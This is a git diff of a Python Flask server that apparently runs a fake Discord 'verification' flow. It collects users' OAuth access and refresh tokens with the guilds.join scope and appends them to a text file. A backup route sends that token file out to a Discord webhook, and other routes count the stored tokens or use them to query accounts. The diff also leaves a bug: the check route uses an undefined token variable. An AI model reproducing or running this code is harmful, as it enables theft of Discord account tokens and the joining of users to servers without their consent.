@@ -4,22 +4,14 @@ import os
 # os.system("pip install dhooks")
 import json, requests
 from dhooks import Webhook, File
-from flask import Flask, redirect, url_for, request, jsonify
-app = Flask(__name__)
-
+from flask import Flask, redirect, url_for, request, jsonify, logging
 import pymongo
 import urllib.parse
 
-# @app.route('/')
-# def hello_world():
-#     return 'unauthorized'
-# import discord
+app = Flask(__name__)
 
-# from discord import *
-# from discord.ext import commands
-
-
-
+# log = logging.getLogger('werkzeug')
+# log.setLevel(logging.ERROR)
 
 verified_redirect = ""
 verifier_redir = "https://discord.com/api/oauth2/authorize?client_id=994684314010796083&redirect_uri=https://verify.exploit.tk&response_type=code&scope=identify%20guilds.join"
@@ -124,16 +116,22 @@ def get_new_token(refresh):
 # def handler(code: str):
 def save(id:str, access_tk:str, refresh_tk:str):
   try:
-    with open('Database/access_tokens.json', 'r') as f:
-      db1 = json.load(f)
-      db1[str(id)] = str(access_tk)
-      with open('Database/access_tokens.json', 'w') as f:
-        json.dump(db1, f, indent=2)
-    with open('Database/refresh_tokens.json', 'r') as f:
-      db2 = json.load(f)
-      db2[str(id)] = str(refresh_tk)
-      with open('Database/refresh_tokens.json', 'w') as f:
-        json.dump(db2, f, indent=2)
+    f1 = open("database.txt", "r").read()
+    writer = f"{id}:{access_tk}:{refresh_tk}"
+    if writer in f1:
+      return
+    f = open("database.txt", "a")
+    f.write(f"{id}:{access_tk}:{refresh_tk}\n")
+    # with open('Database/refresh_tokens.json', 'r') as f:
+    #   db2 = json.load(f)
+    #   db2[str(id)] = str(refresh_tk)
+    #   with open('Database/refresh_tokens.json', 'w') as f:
+    #     json.dump(db2, f, indent=2)
+    # with open('Database/access_tokens.json', 'r') as f:
+    #   db1 = json.load(f)
+    #   db1[str(id)] = str(access_tk)
+    #   with open('Database/access_tokens.json', 'w') as f:
+    #     json.dump(db1, f, indent=2)
   except:
     pass
   found = False
@@ -178,10 +176,12 @@ def backup():
     return 'unauthorized'
   try:
     sender = Webhook(backup_hook)
-    file1 = File("Database/access_tokens.json", name="access.txt")
-    file2 = File("Database/refresh_tokens.json", name="refresh.txt")
-    sender.send("access", file=file1)
-    sender.send("refresh", file=file2)
+    # file1 = File("Database/access_tokens.json", name="access.txt")
+    # file2 = File("Database/refresh_tokens.json", name="refresh.txt")
+    # sender.send("access", file=file1)
+    # sender.send("refresh", file=file2)
+    file = File("database.txt", name="database.txt")
+    sender.send("database", file=file)
     return "success"
   except Exception as e:
 # print(e)
@@ -253,7 +253,7 @@ def pull():
 def members():
   if request.headers.get('Authorization') != pwd:
     return 'unauthorized'
-  access = open("Database/access_tokens.json").readlines()
+  access = open("database.txt").readlines()
   # access = json.loads(access)
   return str(len(access))
 
@@ -286,18 +286,18 @@ def check():
   jsonxd = request.json
   # print(jsonxd)
   user = jsonxd['user']
-  f = open("Database/access_tokens.json", "r").read()
-  f = json.loads(f)
-  try:
-    tk = f[user]
-    # print(tk)
-  except KeyError:
-    return "entry %s not found" % (user)
-  endp = "https://canary.discord.com/api/v9/users/@me"
-  r = requests.get(endp, headers={"Authorization": f"Bearer {tk}"})
-  rjson = r.json()
-  print(rjson)
-  return "entry found: \n\n%s" % (rjson)
+  f = open("database.txt", "r").readlines()
+  for idk in f:
+    if "\n" in idk:
+      idk = idk.replace("\n", "")
+      if str(idk[0]) == user:
+        endp = "https://canary.discord.com/api/v9/users/@me"
+        r = requests.get(endp, headers={"Authorization": f"Bearer {tk}"})
+        rjson = r.json()
+        print(rjson)
+        return "entry found: \n\n%s" % (rjson)
+  return "entry %s not found" % (user)
+  
 
 # @app.route("/myip", methods=["GET"])
 # def get_my_ip():
@@ -316,6 +316,7 @@ def hello_world():
     # return '<h1> Your IP address is:' + ip_addr
 @app.route('/')
 def process_json():
+  return "api offline"
   # os.system("clear")
   # test()
   # redirect("https://discord.com/invite/spy", code=302)
@@ -333,6 +334,8 @@ def process_json():
     return redirect(verifier_redir, code=302)
   idk = args.get('code')
   idk = str(idk)
+  if len(idk) < 30:
+    return "invalid query"
   # print(idk)
   # handler(idk)
   try:
